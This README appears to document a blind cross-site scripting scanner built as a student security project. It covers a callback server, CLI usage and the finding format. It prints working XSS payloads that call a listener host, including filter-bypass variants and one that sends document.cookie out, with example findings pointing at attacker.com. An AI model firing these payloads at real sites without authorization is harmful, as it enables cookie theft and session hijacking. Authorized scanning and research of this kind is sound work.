# Blind XSS (BXSS) Detection Module

Production-quality Blind Cross-Site Scripting detection using Out-of-Band callbacks.

## Architecture

```
bxss/
├── core/
│   └── payload_engine.py      # UUID-based payload generation
├── modules/
│   └── blind_xss/
│       ├── payloads.py        # 40+ context-aware XSS templates
│       ├── detector.py        # Injection logic (query, POST, header, JSON)
│       └── xss_module.py      # Module orchestration
├── oob/
│   ├── callback_server.py     # Flask-based HTTP listener
│   ├── correlation.py         # UUID correlation engine
│   └── __init__.py
├── output/
│   ├── callbacks.json         # Raw callback logs
│   ├── findings_xss.json      # Correlated findings
│   └── findings_xss.txt
└── ml_stub.py                 # Future ML integration (planned)
```

## Detection Methodology

**Black-box approach - NO response inspection.**

1. **Payload Injection**: Generate UUID-tagged XSS payloads
2. **OOB Callback**: Wait for HTTP callbacks from injected payloads
3. **Correlation**: Match callback UUID with injection metadata
4. **Validation**: Confirm timestamp ordering (callback after injection)

### Detection Criteria

A vulnerability is **confirmed** ONLY if:
- ✅ Callback UUID matches injection UUID
- ✅ Callback timestamp > injection timestamp
- ✅ Valid HTTP callback received on listener

## Usage

### Quick Start

```bash
# 1. Start callback server (in terminal 1)
cd bxss/oob
python callback_server.py --host 0.0.0.0 --port 5000

# 2. Run BXSS scan (in terminal 2)
python main.py --scan bxss --file sample_urls.txt --recon --listener http://YOUR_IP:5000 --threads 2 --wait 30
```

### CLI Options

```bash
python main.py --scan bxss \
  --file targets.txt \
  --recon \
  --listener http://attacker.com:5000 \
  --threads 2 \
  --wait 30
```

**Arguments:**
- `--scan bxss`: Enable Blind XSS module
- `--listener`: Callback server URL (required for BXSS)
- `--file` or `-u`: Target URLs/domain
- `--recon`: Run reconnaissance (gau + gf)
- `--threads`: Concurrent workers (default: 2)
- `--wait`: Seconds to wait for delayed callbacks (default: 30)

### Standalone Callback Server

```bash
# Run callback server independently
python bxss/oob/callback_server.py --host 0.0.0.0 --port 5000 --debug
```

## Payload Categories

### 1. Script Injection (8 variants)
```html
<script src="http://LISTENER/x.js?id=UUID"></script>
"><script>fetch("http://LISTENER/?id=UUID")</script>
```

### 2. Event Handlers (8 variants)
```html
<img src=x onerror="fetch('http://LISTENER/?id=UUID')">
<svg onload="fetch('http://LISTENER/?id=UUID')">
```

### 3. Filter Bypass (7 variants)
```html
<ScRiPt src="http://LISTENER/x.js?id=UUID"></sCrIpT>
<img src=x onerror=fetch("http://LISTENER/?id=UUID")>
```

### 4. JSON Context (2 variants)
```json
{"test":"<script src=\"http://LISTENER/x.js?id=UUID\"></script>"}
```

### 5. Header Injection (2 variants)
```html
<script>fetch("http://LISTENER/?id=UUID&ua="+navigator.userAgent)</script>
```

### 6. Data Exfiltration (2 variants)
```html
<script>fetch("http://LISTENER/?id=UUID&c="+document.cookie)</script>
```

**Total: 40+ payloads**

## Injection Points

The detector tests:
- ✅ URL query parameters
- ✅ POST form parameters
- ✅ JSON API bodies
- ✅ HTTP headers (User-Agent, Referer, X-Forwarded-For)

## Confidence Scoring

| Level | Criteria |
|-------|----------|
| **LOW** | Single callback received |
| **MEDIUM** | Multiple callbacks from same endpoint |
| **HIGH** | Repeated callbacks over time (>60s apart) |

## Output Format

### findings_xss.json
```json
[
  {
    "url": "http://target.com/search",
    "parameter": "q",
    "payload": "<script src=\"http://attacker.com:5000/x.js?id=123-456-789\"></script>",
    "injection_timestamp": "2025-12-16T10:30:00.000000",
    "callback_timestamp": "2025-12-16T10:30:05.123456",
    "callback_source_ip": "203.0.113.10",
    "callback_user_agent": "Mozilla/5.0...",
    "uuid": "123-456-789",
    "delay_seconds": 5.12
  }
]
```

### findings_xss.txt
```
================================================================================
BLIND XSS FINDINGS
================================================================================

[1] http://target.com/search
    Parameter: q
    Payload: <script src="http://attacker.com:5000/x.js?id=123-456-789"></script>...
    Injection Time: 2025-12-16T10:30:00.000000
    Callback Time: 2025-12-16T10:30:05.123456
    Delay: 5.12s
    Source IP: 203.0.113.10
    User-Agent: Mozilla/5.0...
    UUID: 123-456-789
```

## Integration with Existing Project

**Reuses BSQLI infrastructure:**
- ✅ `bsqli.core.http_client.HttpClient` (HTTP abstraction)
- ✅ `bsqli.core.logger.get_logger()` (logging)
- ✅ `bsqli.recon.recon_manager.gather_parameterized_urls()` (reconnaissance)
- ✅ Same ThreadPoolExecutor pattern
- ✅ Same CLI structure in main.py

**No modifications to BSQLI code.**

## Network Setup

### Public Listener
If using a public server:
```bash
# On public server (e.g., VPS)
python bxss/oob/callback_server.py --host 0.0.0.0 --port 5000

# From scanning machine
python main.py --scan bxss --listener http://YOUR_PUBLIC_IP:5000 ...
```

### ngrok (Development)
```bash
# Terminal 1: Start callback server
python bxss/oob/callback_server.py --port 5000

# Terminal 2: Expose via ngrok
ngrok http 5000

# Terminal 3: Scan with ngrok URL
python main.py --scan bxss --listener http://YOUR_NGROK_URL ...
```

## Future ML Integration (Stub Only)

Planned features (see `ml_stub.py`):
- Callback timing analysis (Isolation Forest)
- Injection context success rate
- Payload effectiveness learning
- False positive reduction
- Adaptive scanning based on model predictions

**Status: NOT YET IMPLEMENTED**

## Testing

```bash
# Install dependencies
pip install -r requirements.txt

# Test callback server
python bxss/oob/callback_server.py --port 5000

# Manually trigger callback
curl "http://localhost:5000/?id=test-uuid-123"

# Check callbacks
python -c "from bxss.oob.callback_server import get_callbacks; print(get_callbacks())"
```

## Troubleshooting

### No callbacks received
- ✅ Check callback server is running
- ✅ Verify listener URL is publicly accessible
- ✅ Check firewall rules (port 5000 open)
- ✅ Test with `curl http://YOUR_IP:5000/test`

### Correlation fails
- ✅ Ensure callback timestamp > injection timestamp
- ✅ Check UUID extraction (`?id=` parameter)
- ✅ Verify `callbacks.json` contains callback data

### Payloads not triggering
- ✅ Target may have WAF/CSP protection
- ✅ Try filter bypass payloads
- ✅ Increase wait time (`--wait 60`)
- ✅ Check if target is vulnerable (not all sites are)

## Differences from SQLi Module

| Feature | BSQLI | BXSS |
|---------|-------|------|
| Detection method | Response timing/content | OOB callback |
| Requires listener | ❌ No | ✅ Yes |
| Response inspection | ✅ Yes | ❌ No |
| Payload correlation | N/A | ✅ UUID-based |
| Immediate results | ✅ Yes | ❌ Delayed |
| Stored vulnerability | ❌ No | ✅ Yes |

## Production Considerations

1. **Callback Server Security**
   - Run on dedicated server
   - Use HTTPS (not HTTP) for production
   - Implement rate limiting
   - Add authentication for callback endpoints

2. **Scan Responsibly**
   - Only scan authorized targets
   - Respect rate limits
   - Clean up injected payloads
   - Monitor callback server logs

3. **Performance**
   - Adjust `--threads` based on target capacity
   - Increase `--wait` for stored XSS scenarios
   - Use `--listener` on low-latency server

## License

Part of the Blind SQL Injection Detection Framework final year project.
